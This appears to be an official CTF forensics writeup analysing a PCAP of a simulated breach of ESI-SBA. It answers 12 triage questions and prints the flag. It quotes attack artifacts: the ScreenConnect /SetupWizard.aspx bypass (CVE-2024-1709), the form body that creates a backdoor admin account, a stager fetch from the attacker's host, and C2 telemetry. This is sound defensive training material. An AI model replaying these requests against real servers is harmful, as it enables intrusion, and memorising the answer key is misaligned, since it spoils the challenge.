---
title: patient-zero
category: forensics
difficulty: easy
points: 100-500
author: Ch1Hub
date: 2026-11-09
---
# Patient Zero — Complete Official Writeup
**Category:** Forensics / Threat Intelligence  
**Difficulty:** Easy  
**Author:** Ch1Hub  
**Flag:** `ingehack{p4t13nt_z3r0_3s1_sb4_G0t_PWN3d_!}`

---

## 1. Challenge Overview
We are provided with a network capture (`esi_sba_breach.pcapng`) capturing the initial perimeter breach of **ESI-SBA** (*École Supérieure en Informatique de Sidi Bel Abbès*). 

To obtain the flag, we must connect to the live SOC questionnaire server (`nc <host> 1337`) and answer 12 sequential triage and attribution questions based strictly on the PCAP data. One wrong answer terminates the connection.

---

## 2. Step-by-Step Question Breakdown

### Q1: The Victim Machine
* **Question:** What is the internal IP address of the compromised ESI-SBA server?
* **Method:** 
  1. Open `esi_sba_breach.pcapng` in Wireshark.
  2. Go to **Statistics $\rightarrow$ Endpoints $\rightarrow$ IPv4**.
  3. Notice the internal RFC 1918 address `10.10.40.15` receiving incoming web requests.
* **Answer:** `10.10.40.15`

### Q2: The Adversary
* **Question:** What is the external IP address of the attacker who initiated the suspicious traffic?
* **Method:**
  1. Filter Wireshark for `ip.dst == 10.10.40.15`.
  2. The incoming connections initiate from external public IP `185.220.101.44`.
* **Answer:** `185.220.101.44`

### Q3: The Target Gateway
* **Question:** What destination TCP port was the targeted web service listening on?
* **Method:**
  1. Inspect the incoming TCP packets from `185.220.101.44` to `10.10.40.15`.
  2. The destination port is `8040`.
* **Answer:** `8040`

### Q4: The Hostname
* **Question:** What is the NetBIOS/hostname of the compromised server as identified in HTTP response headers?
* **Method:**
  1. Apply filter `http.response.code == 200`.
  2. Inspect frame 214 (response to `GET /Login.aspx`).
  3. Under HTTP headers:
     `X-Server-Hostname: PORTAL-SBA-01`
* **Answer:** `PORTAL-SBA-01`

### Q5: The Rogue Endpoint
* **Question:** What exact URI request path did the attacker submit to bypass the initial access controls?
* **Method:**
  1. Apply filter `http.request.method == "POST"`.
  2. Inspect Frame 344:
     `POST /SetupWizard.aspx/SetupWizard.aspx HTTP/1.1`
* **Answer:** `/SetupWizard.aspx/SetupWizard.aspx`

### Q6: The Backdoor Account
* **Question:** What username did the attacker register through the rogue setup wizard to establish administrative persistence?
* **Method:**
  1. Inspect the body of Frame 344 (`application/x-www-form-urlencoded`).
  2. The parameters:
     `userName=adm_esisba_support&password=P%40ssw0rd2026%21&email=support%40dz-cdn.net&action=setup_admin`
* **Answer:** `adm_esisba_support`

### Q7: Staged Payload Filename
* **Question:** Following the authentication bypass, the attacker executed commands to download a staging script from their infrastructure. What is the filename of this stager?
* **Method:**
  1. Apply filter `http.request.uri contains ".ps1"`.
  2. Frame 536 shows the victim (`10.10.40.15`) sending a request to `185.220.101.44:8888`:
     `GET /agent_stager.ps1 HTTP/1.1`
* **Answer:** `agent_stager.ps1`

### Q8: Payload Integrity (Hash)
* **Question:** What is the SHA-256 hash of the carved `agent_stager.ps1` payload?
* **Method:**
  1. In Wireshark, navigate to **File $\rightarrow$ Export Objects $\rightarrow$ HTTP**.
  2. Select `agent_stager.ps1` and save it to disk.
  3. Calculate the SHA-256 hash:
     ```bash
     sha256sum agent_stager.ps1
     ```
* **Answer:** `40c4c9bb11bb069e9cf6404fcbf52f4f67a9c2e052c51b31e585478e609ac593`

### Q9: Compromised User Context
* **Question:** Under what active Windows user account did the stager's reconnaissance commands execute?
* **Method:**
  1. Inspect Frame 590: an outbound `POST /api/v1/telemetry` sent by the victim to the C2 server.
  2. Expand the JSON body:
     ```json
     {
       "dc": "DC01.ESI-SBA.DZ",
       "host": "PORTAL-SBA-01",
       "ip": "10.10.40.15",
       "os": "Windows Server 2022 Standard 10.0.20348",
       "timestamp": "2026-11-08T14:22:45Z",
       "user": "ESISBA\\a.amrane"
     }
     ```
* **Answer:** `ESISBA\a.amrane` *(or `a.amrane`)*

### Q10: Domain Discovery
* **Question:** The attacker performed internal Active Directory discovery. What is the Fully Qualified Domain Name (FQDN) of the primary Domain Controller discovered?
* **Method:**
  1. In the same Frame 590 JSON payload, inspect the `"dc"` key:
     `"dc": "DC01.ESI-SBA.DZ"`
* **Answer:** `DC01.ESI-SBA.DZ`

### Q11: Root-Cause Attribution (CVE)
* **Question:** Based on the affected service on port 8040 and the specific `/SetupWizard.aspx` traversal vector, what is the official CVE identifier for this vulnerability?
* **Method:**
  1. Search threat intelligence sources for ConnectWise ScreenConnect on port 8040 with `/SetupWizard.aspx` authentication bypass.
  2. CVE-2024-1709 (CVSS 10.0) is the globally documented vulnerability for this flaw.
* **Answer:** `CVE-2024-1709`

### Q12: MITRE ATT&CK Classification
* **Question:** What is the primary MITRE ATT&CK technique ID for the initial access vector used to compromise this perimeter asset?
* **Method:**
  1. Exploiting a public-facing application (CVE-2024-1709) directly maps to MITRE ATT&CK Technique **T1190** (*Exploit Public-Facing Application*).
* **Answer:** `T1190`

---

## 3. Flag
Upon correctly answering all 12 questions, the server outputs:
```text
Flag: ingehack{p4t13nt_z3r0_3s1_sb4_G0t_PWN3d_!}
```
